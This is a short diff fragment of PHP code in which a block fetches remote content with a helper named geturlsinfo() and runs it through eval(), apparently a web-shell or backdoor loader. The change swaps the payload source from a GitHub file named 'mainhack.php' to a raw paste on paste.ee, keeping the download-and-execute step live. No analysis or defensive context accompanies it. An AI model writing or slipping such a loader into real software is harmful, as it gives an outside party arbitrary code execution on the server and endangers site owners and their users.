@@ -56,7 +56,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/Mainhack-Exec/mainhack/refs/heads/main/mainhack.php';
+    $destiny = 'https://paste.ee/r/UZuxt';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
